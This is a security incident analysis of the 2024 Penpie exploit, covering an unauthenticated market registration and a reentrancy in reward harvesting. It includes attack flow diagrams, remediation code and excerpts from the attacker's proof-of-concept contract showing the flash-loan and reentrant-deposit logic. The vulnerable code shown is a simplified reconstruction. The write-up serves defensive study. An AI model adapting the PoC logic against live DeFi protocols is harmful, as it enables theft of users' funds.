# Penpie — Reward Inflation via Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-03 |
| **Protocol** | Penpie (Penpiexyz) |
| **Chain** | Ethereum Mainnet (Block #20,671,878) |
| **Loss** | $27,000,000 (agETH + rswETH) |
| **Attacker** | [0x7A2f...1D1B](https://etherscan.io/address/0x7A2f4D625Fb21F5e51562cE8Dc2E722e12A61d1B) |
| **Attack Contract** | [0x4476...87AE](https://etherscan.io/address/0x4476b6ca46B28182944ED750e74e2Bb1752f87AE) |
| **Attack Tx 1 (Market Creation)** | [0x7e7f...d1d1](https://etherscan.io/tx/0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1) |
| **Attack Tx 2 (Exploit)** | [0x42b2...d8e5](https://etherscan.io/tx/0x42b2ec27c732100dd9037c76da415e10329ea41598de453bb0c0c9ea7ce0d8e5) |
| **Root Cause** | Reward inflation via reentrancy after registering a malicious Pendle market |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Penpiexyzio_exp.sol) |

---

## 1. Vulnerability Overview

Penpie is a yield optimization protocol built on top of Pendle Finance. Users deposit Pendle LP tokens into Penpie and earn additional rewards.

This attack exploited a combination of two vulnerabilities:

1. **Unauthorized Pendle Market Registration**: `PendleMarketRegisterHelper.registerPenpiePool()` allowed anyone to register an arbitrary Pendle market in Penpie without any validation. The attacker created a fake Pendle market backed by a malicious SY (Standard Yield) contract they controlled and registered it in Penpie.

2. **Reentrancy Vulnerability**: During `PendleStaking.batchHarvestMarketRewards()`'s call to the external contract (`SY.claimRewards()`), control was transferred to the attacker's callback before state updates were complete. From within this callback, the attacker reentered to deposit large amounts of LP tokens into real Pendle markets (PENDLE_LPT_0x6010, PENDLE_LPT_0x038c) via `depositMarket()`, then immediately claimed inflated rewards once reward accounting was finalized.

Through this combination of two vulnerabilities, the attacker drained approximately $27M worth of agETH and rswETH.

---

## 2. Vulnerable Code Analysis

### 2.1 Unauthorized Market Registration — Missing Access Control

```solidity
// ❌ Vulnerable code: PendleMarketRegisterHelper.registerPenpiePool()
// Anyone can register an arbitrary market in Penpie with no caller validation
function registerPenpiePool(address _market) external {
    // No access control such as onlyOwner or onlyGovernance
    // Does not validate whether _market is an official Pendle market
    IPenpiePoolHelper(pendleMarketDepositHelper).registerPool(_market);
    // Adding the pool to PendleStaking also permits malicious markets
}
```

```solidity
// ✅ Fixed code: Added access control and market validation
function registerPenpiePool(address _market) external onlyOwner {
    // Verify the market was created by the official Pendle market factory
    require(
        IPendleMarketFactory(PENDLE_MARKET_FACTORY).isValidMarket(_market),
        "Unauthorized market: only official Pendle markets may be registered"
    );
    IPenpiePoolHelper(pendleMarketDepositHelper).registerPool(_market);
}
```

**Issue**: `registerPenpiePool()` has no access control such as `onlyOwner` or `onlyGovernance`, and does not verify whether the supplied market address was created by the official Pendle factory. The attacker exploited this to register a fake market backed by a malicious SY contract they controlled.

---

### 2.2 Reentrancy Vulnerability — batchHarvestMarketRewards()

```solidity
// ❌ Vulnerable code: PendleStaking.batchHarvestMarketRewards()
// Violates CEI (Checks-Effects-Interactions) pattern
// State is not updated before the external call
function batchHarvestMarketRewards(
    address[] calldata _markets,
    uint256 minEthToRecieve
) external {
    for (uint256 i = 0; i < _markets.length; i++) {
        address market = _markets[i];
        Pool storage pool = pools[market];
        
        // ❌ This external call triggers the attacker's callback
        // SY.claimRewards() invokes the attacker contract's claimRewards()
        uint256[] memory rewards = ISY(pool.sy).claimRewards(address(this));
        
        // ❌ Reward accounting is performed after the external call
        // The attacker reenters during the external call, calls depositMarket(),
        // and claims rewards based on the inflated deposit amount
        _updateRewards(market, rewards);
    }
}
```

```solidity
// ✅ Fixed code: Added nonReentrant guard + CEI pattern compliance
// nonReentrant modifier applied to block reentrancy
function batchHarvestMarketRewards(
    address[] calldata _markets,
    uint256 minEthToRecieve
) external nonReentrant {
    for (uint256 i = 0; i < _markets.length; i++) {
        address market = _markets[i];
        Pool storage pool = pools[market];
        
        // ✅ Snapshot: record total supply before the call
        uint256 totalSupplyBefore = IERC20(pool.receiptToken).totalSupply();
        
        // External call
        uint256[] memory rewards = ISY(pool.sy).claimRewards(address(this));
        
        // ✅ Verify total supply has not changed after the call
        uint256 totalSupplyAfter = IERC20(pool.receiptToken).totalSupply();
        require(totalSupplyBefore == totalSupplyAfter, "Reentrancy detected: deposit amount changed");
        
        _updateRewards(market, rewards);
    }
}
```

**Issue**: `batchHarvestMarketRewards()` calls `claimRewards()` on an external SY contract. When this call lands in the callback of an attacker-controlled malicious SY, the attacker calls `depositMarket()` from within the callback to deposit large amounts of LP tokens into real Pendle markets. Reward distribution is then calculated based on the modified (inflated) deposit amount, allowing the attacker to claim far more rewards than they are entitled to.

---

## 3. Attack Flow

### 3.1 Preparation Phase (Tx 1: Block #20,671,877)

In the first transaction, the attacker created a fake Pendle market backed by a malicious SY contract (the attacker contract itself acting as SY) and registered it in Penpie.

### 3.2 Execution Phase (Tx 2: Block #20,671,878)

```
Step 1: Request flash loan from Balancer Vault
   - Full balance of agETH + full balance of rswETH (~$27M)

Step 2: Enter receiveFlashLoan() callback

Step 3: Call batchHarvestMarketRewards([malicious_PENDLE_LPT])
   - PendleStaking calls claimRewards() on the malicious SY
   - Enter attacker callback

Step 4: Inside claimRewards() callback — Reentrancy
   - agETH → PendleRouterV4.addLiquiditySingleTokenKeepYt()
     → Obtain PENDLE_LPT_0x6010 LP tokens
   - PENDLE_LPT_0x6010 LP → PendleMarketDepositHelper.depositMarket()
     → Deposit LP into Penpie (inflates reward calculation basis)
   - rswETH → PendleRouterV4.addLiquiditySingleTokenKeepYt()
     → Obtain PENDLE_LPT_0x038c LP tokens
   - PENDLE_LPT_0x038c LP → PendleMarketDepositHelper.depositMarket()
     → Deposit LP into Penpie (inflates reward calculation basis)

Step 5: Malicious SY claimRewards() returns → batchHarvestMarketRewards reward accounting
   - Rewards distributed based on inflated deposit amounts

Step 6: MasterPenpie.multiclaim() — Collect inflated rewards

Step 7: withdrawMarket() — Withdraw deposited LP, then removeLiquiditySingleToken()
   - Recover agETH, rswETH

Step 8: Repay flash loan to Balancer Vault (no fee)
   - Remaining agETH + rswETH = net profit (~$27M)
```

### 3.3 Attack Flow Diagram

```
Attacker EOA (0x7A2f...1D1B)
        │
        │ [Tx 1: Block #20,671,877]
        ▼
┌─────────────────────────────────────────┐
│  Attacker Contract (acting as malicious SY) │
│  ① createYieldContract(SY=self)         │
│     → Create PT + YT                    │
│  ② PendleMarketFactoryV3.createNewMarket│
│     → Create malicious PENDLE_LPT       │
│  ③ registerPenpiePool(malicious_LPT) ← ❌ │
│     Register in Penpie with no auth check │
│  ④ Initial LP deposit (seed liquidity)  │
└─────────────────────────────────────────┘
        │
        │ [Tx 2: Block #20,671,878]
        ▼
┌─────────────────────────────────────────┐
│  attack() called                         │
│  Balancer flashLoan(agETH, rswETH)      │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  Enter receiveFlashLoan()                │
│  batchHarvestMarketRewards([malicious_LPT]) │
└──────────────┬──────────────────────────┘
               │ PendleStaking → maliciousSY.claimRewards() external call
               ▼
┌─────────────────────────────────────────┐
│  claimRewards() callback ← ❌ Reentrancy │
│  ┌───────────────────────────────────┐  │
│  │  agETH → addLiquiditySingleToken  │  │
│  │  → Obtain PENDLE_LPT_0x6010 LP    │  │
│  │  → depositMarket(LPT_0x6010)      │  │◀── Inflate deposit amount
│  │                                   │  │
│  │  rswETH → addLiquiditySingleToken │  │
│  │  → Obtain PENDLE_LPT_0x038c LP    │  │
│  │  → depositMarket(LPT_0x038c)      │  │◀── Inflate deposit amount
│  └───────────────────────────────────┘  │
└──────────────┬──────────────────────────┘
               │ claimRewards() returns
               ▼
┌─────────────────────────────────────────┐
│  batchHarvestMarketRewards reward accounting │
│  ← Calculated based on inflated deposits ❌ │
│  multiclaim() → Collect inflated rewards │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  Withdraw LP → removeLiquiditySingleToken │
│  Recover agETH + rswETH                 │
│  Repay Balancer (no flash loan fee)     │
│  Net profit: ~$27,000,000              │
└─────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: ~$27,000,000 total in agETH + rswETH drained
- **Protocol loss**: Rewards of actual Pendle market liquidity providers exhausted

---

## 4. PoC Code (Key Logic Excerpts + Comments)

```solidity
// ============================================================
// Phase 1: Malicious market creation and Penpie registration (Tx 1)
// ============================================================
function createMarket() external {
    // Create PT/YT pair using the attacker contract itself as the malicious SY
    // assetInfo(), exchangeRate(), getRewardTokens(), etc. are arbitrarily implemented
    (address PT, address YT) =
        Interfaces(PendleYieldContractFactory).createYieldContract(
            address(this), // SY role = attacker contract itself
            1_735_171_200, // expiry timestamp
            true
        );

    // Create a new Pendle market using the malicious PT
    PENDLE_LPT = Interfaces(PendleMarketFactoryV3).createNewMarket(
        PT, 23_352_202_321_000_000_000, 1_032_480_618_000_000_000, 1_998_002_662_000_000
    );

    // ❌ Core vulnerability 1: Register malicious market in Penpie with no auth check
    // registerPenpiePool() is callable by anyone, with no market validity check
    Interfaces(PendleMarketRegisterHelper).registerPenpiePool(PENDLE_LPT);

    // Mint malicious SY tokens to the YT contract address (provide SY needed for PT/YT creation)
    _mint(address(YT), 1 ether);
    Interfaces(YT).mintPY(address(this), address(this));

    // Transfer PT to the malicious PENDLE_LPT and provide seed liquidity
    uint256 bal = IERC20(PT).balanceOf(address(this));
    IERC20(PT).transfer(PENDLE_LPT, bal);
    _mint(address(PENDLE_LPT), 1 ether);
    Interfaces(PENDLE_LPT).mint(address(this), 1 ether, 1 ether);

    // Deposit initial LP tokens into the malicious market (enter Penpie pool)
    IERC20(PENDLE_LPT).approve(PendleStaking_0x6e79, type(uint256).max);
    Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT, 999_999_999_999_999_000);
}

// ============================================================
// Phase 2: Flash loan-based attack execution (Tx 2)
// ============================================================
function attack() external {
    // Flash loan full balances of agETH and rswETH from Balancer Vault
    // These two tokens are the underlying assets of PENDLE_LPT_0x6010, PENDLE_LPT_0x038c
    address[] memory tokens = new address[](2);
    tokens[0] = agETH;
    tokens[1] = rswETH;
    uint256[] memory amounts = new uint256[](2);
    saved_bal1 = IERC20(agETH).balanceOf(balancerVault);   // borrow entire balance
    amounts[0] = saved_bal1;
    saved_bal2 = IERC20(rswETH).balanceOf(balancerVault);  // borrow entire balance
    amounts[1] = saved_bal2;
    Interfaces(balancerVault).flashLoan(address(this), tokens, amounts, "");
}

// ============================================================
// Phase 3: Flash loan callback — Trigger reentrancy
// ============================================================
function receiveFlashLoan(
    address[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
) external {
    // ❌ Core vulnerability 2: batchHarvestMarketRewards → SY.claimRewards() external call
    // This call triggers the attacker contract's claimRewards() callback
    // The callback reenters and inflates deposit amounts via depositMarket()
    address[] memory _markets = new address[](1);
    _markets[0] = PENDLE_LPT; // specify malicious market
    Interfaces(PendleStaking_0x6e79).batchHarvestMarketRewards(_markets, 0);

    // After reentrancy completes, collect inflated rewards
    Interfaces(MasterPenpie).multiclaim(_markets);

    // Withdraw the real LP tokens deposited during reentrancy
    Interfaces(PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_LPT_0x6010, saved_bal);
    // ... Convert PENDLE_LPT_0x6010 LP → agETH (removeLiquiditySingleToken)

    Interfaces(PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_LPT_0x038c, saved_value);
    // ... Convert PENDLE_LPT_0x038c LP → rswETH (removeLiquiditySingleToken)

    // Repay flash loan (Balancer charges no fee)
    IERC20(agETH).transfer(balancerVault, saved_bal1);
    IERC20(rswETH).transfer(balancerVault, saved_bal2);
    // Remaining agETH + rswETH = net profit
}

// ============================================================
// Phase 4: claimRewards callback — Core reentrancy logic
// ============================================================
// ❌ This function is called from within batchHarvestMarketRewards(), causing reentrancy
function claimRewards(address user) external returns (uint256[] memory rewardAmounts) {
    if (claimRewardsCall == 1) { // Execute reentrancy on the second call
        // Convert agETH to LP tokens for real Pendle market PENDLE_LPT_0x6010
        IERC20(agETH).approve(PendleRouterV4, type(uint256).max);
        uint256 bal_agETH = IERC20(agETH).balanceOf(address(this));
        // addLiquiditySingleTokenKeepYt → obtain LP tokens
        // ❌ depositMarket() deposits into Penpie → inflates reward distribution basis
        Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT_0x6010, saved_bal);

        // Convert rswETH to LP tokens for real Pendle market PENDLE_LPT_0x038c and deposit
        IERC20(rswETH).approve(PendleRouterV4, type(uint256).max);
        uint256 bal_rswETH = IERC20(rswETH).balanceOf(address(this));
        // addLiquiditySingleTokenKeepYt → obtain LP tokens
        // ❌ depositMarket() deposits into Penpie → inflates reward distribution basis
        Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT_0x038c, bal_PENDLE_LPT_0x038c_this);
        // Control returns to batchHarvestMarketRewards at this point
        // Reward accounting is performed against the inflated deposit amount
    }
    claimRewardsCall++;
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Incidents |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Reentrancy (in batchHarvestMarketRewards) | CRITICAL | CWE-841 | `01_reentrancy.md` | Curve Finance (2023, $70M), Cream Finance (2021, $130M) |
| V-02 | Missing Access Control (registerPenpiePool unauthorized) | CRITICAL | CWE-284 | `03_access_control.md` | Poly Network (2021, $611M) |
| V-03 | Missing Input Validation (market validity not checked) | HIGH | CWE-20 | `03_access_control.md` | — |
| V-04 | Reward manipulation via flash loan | HIGH | CWE-400 | `02_flash_loan.md`, `17_staking_reward.md` | Harvest Finance (2020, $34M) |

### V-01: Reentrancy (in batchHarvestMarketRewards)

- **Description**: When `PendleStaking.batchHarvestMarketRewards()` calls `claimRewards()` on an external SY contract, the state update (reward accounting) does not occur before the call completes. The attacker-controlled SY contract exploits this callback to reenter `depositMarket()`, dramatically inflating the deposit amount in real Pendle markets.
- **Impact**: The attacker receives rewards calculated against deposit amounts that did not actually exist at that point in time. Rewards owed to other legitimate depositors in the protocol are drained.
- **Attack Conditions**:
  1. Ability to create a fake Pendle market backed by a malicious SY contract
  2. Ability to register that market in Penpie (prerequisite: V-02 vulnerability)
  3. Ability to deposit a sufficiently large proportion of LP relative to the reward pool during reentrancy via flash loan funds

### V-02: Missing Access Control (registerPenpiePool unauthorized)

- **Description**: `PendleMarketRegisterHelper.registerPenpiePool()` has no access control such as `onlyOwner` or `onlyGovernance`, allowing anyone to register an arbitrary address as a Penpie market. Furthermore, it does not verify whether the supplied market was created by the official Pendle market factory.
- **Impact**: An attacker can register an arbitrary Pendle market with a malicious SY into Penpie, creating an entry point for reentrancy attacks.
- **Attack Conditions**: Any EOA or contract that can directly call `registerPenpiePool()` can mount this attack.

### V-03: Missing Input Validation (market validity not checked)

- **Description**: When Penpie interacts with a Pendle market, it does not verify whether that market's SY is a safe implementation. The attacker contract itself acts as the SY and can arbitrarily implement `assetInfo()`, `exchangeRate()`, `getRewardTokens()`, `claimRewards()`, etc.
- **Impact**: A malicious SY gains control over every code path through which it interacts with Penpie's core reward distribution logic.
- **Attack Conditions**: Automatically satisfied when combined with V-02.

### V-04: Reward Manipulation via Flash Loan

- **Description**: The attacker borrows approximately $27M worth of agETH and rswETH in a single transaction via Balancer's uncollateralized flash loan (0% fee). These funds are used to provide liquidity to real Pendle markets within the reentrancy callback, then withdrawn immediately after reward calculation completes.
- **Impact**: Instantaneous deposit of enormous liquidity allows manipulation of the reward distribution ratio.
- **Attack Conditions**: Combination with the reentrancy vulnerability (V-01) is mandatory. Reward manipulation without reentrancy is not possible on its own.

---

## 6. Remediation Recommendations

### Immediate Actions

**① Add access control to registerPenpiePool()**

```solidity
// ✅ Fix: onlyOwner access control + official market factory validation
function registerPenpiePool(address _market) external onlyOwner {
    // Verify the market was created by the official Pendle market factory
    require(
        IPendleMarketFactory(PENDLE_MARKET_FACTORY).isValidMarket(_market),
        "PenpieHelper: unauthorized market"
    );
    // Additional validation of whether the SY contract is a safe implementation is possible
    // (e.g., whitelist, passed audit, etc.)
    IPenpiePoolHelper(pendleMarketDepositHelper).registerPool(_market);
    emit PoolRegistered(_market, msg.sender);
}
```

**② Prevent reentrancy in batchHarvestMarketRewards()**

```solidity
// ✅ Fix: Add nonReentrant guard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PendleStaking is ReentrancyGuard {
    function batchHarvestMarketRewards(
        address[] calldata _markets,
        uint256 minEthToRecieve
    ) external nonReentrant {
        // ... existing logic
    }

    // ✅ Also apply reentrancy protection to depositMarket()
    // A separate state flag can be used to block deposits while harvesting is in progress
    bool private _harvesting;
    
    modifier notHarvesting() {
        require(!_harvesting, "PendleStaking: deposit not allowed during harvest");
        _;
    }
    
    function batchHarvestMarketRewards(...) external nonReentrant {
        _harvesting = true;
        // ... reward accounting logic
        _harvesting = false;
    }
    
    function depositMarket(...) external notHarvesting {
        // ... existing deposit logic
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Reentrancy | Apply `nonReentrant` modifier to `batchHarvestMarketRewards()`, `depositMarket()`, and `withdrawMarket()` across the board. Enforce CEI pattern: update state before making external calls |
| V-02 Access Control | Apply `onlyOwner`/`onlyGovernance` to `registerPenpiePool()`. Introduce a timelock to allow a review period before registration takes effect |
| V-03 Input Validation | Check `isValidMarket()` from the official Pendle market factory at registration time. Introduce SY contract whitelist management |
| V-04 Flash Loan Manipulation | Introduce a reward snapshot mechanism: compare total deposit amounts before and after `claimRewards()`. Exclude or apply time-weighting to reward calculations for large deposits/withdrawals within a single block |

---

## 7. Lessons Learned

1. **nonReentrant is mandatory for all functions that include external callbacks**: Functions that iterate over external contract calls — such as reward harvesting — must be equipped with reentrancy guards. Especially at DeFi composability integration points, callbacks can become unexpected reentrancy vectors.

2. **Permissionless registration functions are always potential attack vectors**: Functions such as `registerPool()`, `addMarket()`, and `createVault()` that allow external callers to register arbitrary addresses into the system become critical vulnerabilities when access control is absent. The risk is even greater when the registered address subsequently becomes the target of external calls.

3. **Reward designs must account for flash loan attacks**: When reward distribution is based on instantaneous deposit amounts, the system is vulnerable to flash loan attacks. Time-Weighted Average Deposit (TWAD) or lock-up periods before reward eligibility should be adopted.

4. **Clearly define trust boundaries**: Penpie was designed to trust Pendle Finance's contracts, but overlooked the fact that anyone can create a Pendle market. The impact of a target protocol's permissionless features on one's own system must be analyzed thoroughly.

5. **Consistently apply the Checks-Effects-Interactions (CEI) pattern**: Updating state after an external call is the archetypal cause of reentrancy attacks. During code review, the ordering of state changes relative to external calls must be examined without exception.

6. **The importance of composability audits**: Security audits of a single protocol in isolation are insufficient. For protocols built on top of other protocols — like Penpie — a separate analysis must be conducted to determine how permissionless features of the underlying protocol can undermine the trust model of the overlying protocol.

---

## 8. On-Chain Verification

### 8.1 Attack Transaction Details

| Field | Value |
|------|-----|
| Attacker EOA | `0x7A2f4D625Fb21F5e51562cE8Dc2E722e12A61d1B` |
| Attack Contract | `0x4476b6ca46B28182944ED750e74e2Bb1752f87AE` |
| Tx 1 (Market Creation) | `0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1` |
| Tx 2 (Exploit) | `0x42b2ec27c732100dd9037c76da415e10329ea41598de453bb0c0c9ea7ce0d8e5` |
| Attack Block | #20,671,878 (Ethereum Mainnet) |
| Block Timestamp | 2024-09-03 |

### 8.2 On-Chain Verification Notes

The PoC code's `vm.createSelectFork("mainnet", 20_671_878 - 1)` and all contract addresses used (Balancer Vault `0xBA122...`, Pendle `0x8888...`) are confirmed to be Ethereum Mainnet addresses. The project name "Penpiexyz_io" indicates the attack occurred on Ethereum Mainnet.

### 8.3 Vulnerable Contract Address List

| Contract | Address | Role |
|----------|------|------|
| PendleStaking | [0x6E79...3652](https://etherscan.io/address/0x6E799758CEE75DAe3d84e09D40dc416eCf713652) | Reward harvesting (reentrancy entry point) |
| PendleMarketRegisterHelper | [0xd20c...353a](https://etherscan.io/address/0xd20c245e1224fC2E8652a283a8f5cAE1D83b353a) | Market registration (missing access control) |
| PendleMarketDepositHelper | [0x1C1F...0f4](https://etherscan.io/address/0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4) | LP deposit/withdrawal helper |
| MasterPenpie | [0x1629...47d0](https://etherscan.io/address/0x16296859C15289731521f199F0a5f762dF6347d0) | Reward collection |
| Balancer Vault | [0xBA12...2C8](https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8) | Flash loan source |

---

*Analysis written: 2026-04-11 | Pattern references: `01_reentrancy.md`, `03_access_control.md`, `02_flash_loan.md`, `17_staking_reward.md`*